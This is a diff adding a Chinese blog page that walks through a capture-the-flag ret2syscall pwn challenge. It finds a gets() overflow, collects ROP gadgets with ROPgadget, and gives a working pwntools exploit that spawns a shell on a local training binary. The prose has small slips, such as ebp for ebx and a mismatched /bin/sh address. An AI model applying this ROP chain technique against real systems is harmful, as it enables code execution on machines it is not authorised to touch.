@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言通过一道PWN题目学习ROP，ROP攻击是指攻击者获得对调用堆栈的控制来劫持程序控制流，然后执行精心选择的机器指令序列，这些指令序列已经存在于机器的内存中，称为“gadget”。每个小工具（一系列以跳转指令结尾的汇编代码）通常以返回指令结束，并位于现有程序和/或共享库代码中的子例程中。这些小工具连接在一起，使攻击者能够对使用防御系统的机器执行任意操作。 这里我们需要构造的gadget如下 12">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP学习">
+<meta property="og:url" content="elssm.github.io/2022/12/29/ROP学习/index.html">
+<meta property="og:site_name" content="ELSSM&#39;s Blog">
+<meta property="og:description" content="前言通过一道PWN题目学习ROP，ROP攻击是指攻击者获得对调用堆栈的控制来劫持程序控制流，然后执行精心选择的机器指令序列，这些指令序列已经存在于机器的内存中，称为“gadget”。每个小工具（一系列以跳转指令结尾的汇编代码）通常以返回指令结束，并位于现有程序和/或共享库代码中的子例程中。这些小工具连接在一起，使攻击者能够对使用防御系统的机器执行任意操作。 这里我们需要构造的gadget如下 12">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="/2022/12/29/ROP学习/1.png">
+<meta property="og:image" content="/2022/12/29/ROP学习/2.png">
+<meta property="og:image" content="/2022/12/29/ROP学习/3.png">
+<meta property="og:updated_time" content="2022-12-29T10:43:02.414Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ROP学习">
+<meta name="twitter:description" content="前言通过一道PWN题目学习ROP，ROP攻击是指攻击者获得对调用堆栈的控制来劫持程序控制流，然后执行精心选择的机器指令序列，这些指令序列已经存在于机器的内存中，称为“gadget”。每个小工具（一系列以跳转指令结尾的汇编代码）通常以返回指令结束，并位于现有程序和/或共享库代码中的子例程中。这些小工具连接在一起，使攻击者能够对使用防御系统的机器执行任意操作。 这里我们需要构造的gadget如下 12">
+<meta name="twitter:image" content="/2022/12/29/ROP学习/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="elssm.github.io/2022/12/29/ROP学习/">
+
+
+
+
+
+  <title>ROP学习 | ELSSM's Blog</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ELSSM's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="elssm.github.io/2022/12/29/ROP学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Elssm">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/author2.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ELSSM's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ROP学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-12-29T18:37:21+08:00">
+                2022-12-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>通过一道PWN题目学习ROP，ROP攻击是指攻击者获得对调用堆栈的控制来劫持程序控制流，然后执行精心选择的机器指令序列，这些指令序列已经存在于机器的内存中，称为“gadget”。每个小工具（一系列以跳转指令结尾的汇编代码）通常以返回指令结束，并位于现有程序和/或共享库代码中的子例程中。这些小工具连接在一起，使攻击者能够对使用防御系统的机器执行任意操作。</p>
+<p>这里我们需要构造的gadget如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0xb</span><br><span class="line">mov ebx,["/bin/sh"]</span><br><span class="line">mov ecx,0</span><br><span class="line">mov edx,0</span><br><span class="line">int 0x80</span><br><span class="line">==&gt; execve("/bin/sh",NULL,NULL)</span><br></pre></td></tr></table></figure>
+<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>checksec查看开启了哪些保护机制</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % checksec ret2syscall</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>通过查看架构得之主要的寄存器有<code>eax ebp ebx ecx..</code></p>
+<p>程序执行如下，输出前两句后接受输入，然后退出</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos rop]# ./ret2syscall</span><br><span class="line">This time, no system() and NO SHELLCODE!!!</span><br><span class="line">What do you plan to do?</span><br><span class="line">aaaa</span><br></pre></td></tr></table></figure>
+<p>反编译查看，从gets函数得之存在溢出漏洞</p>
+<p><img src="/2022/12/29/ROP学习/1.png" alt="1"></p>
+<p><code>pwndbg</code>查看寄存器位置，发现eax寄存器位置为<code>0xffffd29c</code>，<code>ebp</code>寄存器的位置为<code>0xffffd308</code>，如果我们想要覆盖掉<code>ebp</code>寄存器的位置，则需要填充的字节为<code>0xffffd308-0xffffd29c</code>字节再加上<code>ebp</code>所占的4个字节，因为架构是32位的。即需要填充112字节。</p>
+<p><img src="/2022/12/29/ROP学习/2.png" alt="2"></p>
+<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>接着我们通过<code>ROPgadget</code>工具寻找<code>gadget</code></p>
+<p>首先寻找eax的<code>pop|ret</code>地址，选择<code>0x080bb196</code>地址最合适</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % ROPgadget --binary ret2syscall --only "pop|ret" | grep eax</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>
+<p>接着寻找ebx的<code>pop|ret</code>地址，有很多，哪一个最适合呢，发现<code>0x0806eb90</code>最合适，因为它也有<code>ecx</code>和<code>edx</code>寄存器。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % ROPgadget --binary ret2syscall --only "pop|ret" | grep ebx</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+<p>最后我们寻找<code>int</code>，地址为<code>0x08049421</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % ROPgadget --binary ret2syscall --only "int"</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure>
+<p>因为ebp寄存器中需要写入<code>/bin/sh</code>，因此我们还需要在程序中找到<code>/bin/sh</code>的地址</p>
+<p>在<code>ghidra</code>中全局搜索发现地址为<code>0x08049421</code></p>
+<p><img src="/2022/12/29/ROP学习/3.png" alt="3"></p>
+<h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>编写<code>exp</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_80h = <span class="number">0x08049421</span></span><br><span class="line">bin_sh = <span class="number">0x080be408</span></span><br><span class="line">payload = flat([<span class="string">b'A'</span>*<span class="number">112</span>, pop_eax_ret,<span class="number">0xb</span>,pop_edx_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_sh,int_80h])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>本地执行<code>exp</code>获取<code>shell</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos rop]# python3 exp.py</span><br><span class="line">[+] Starting local process './ret2syscall': pid 3300219</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">This time, no system() and NO SHELLCODE!!!</span><br><span class="line">What do you plan to do?</span><br><span class="line"><span class="meta">$</span> ls</span><br><span class="line">exp.py       ret2libc2  ret2shellcode  ret2text</span><br><span class="line">ret2libc1  ret2libc3  ret2syscall    tools</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/12/15/读书分享II/" rel="next" title="读书分享II">
+                <i class="fa fa-chevron-left"></i> 读书分享II
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/author2.png" alt="Elssm">
+            
+              <p class="site-author-name" itemprop="name">Elssm</p>
+              <p class="site-description motion-element" itemprop="description">Web/Cloud/ML Security  Adversarial Training</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/elssm" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://leetcode.cn/u/elssm/" target="_blank" title="Leetcode">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Leetcode</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00"><span class="nav-number">2.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01"><span class="nav-number">3.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02"><span class="nav-number">4.</span> <span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03"><span class="nav-number">5.</span> <span class="nav-text">0x03</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Elssm</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a></div>
+
+
+
+<span id="busuanzi_container_site_pv" class="theme-info">
+&nbsp;&nbsp;|&nbsp;&nbsp;本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  </span>
+  <span id="busuanzi_container_site_uv" class="theme-info">
+&nbsp;&nbsp;|&nbsp;&nbsp;本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  </span>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
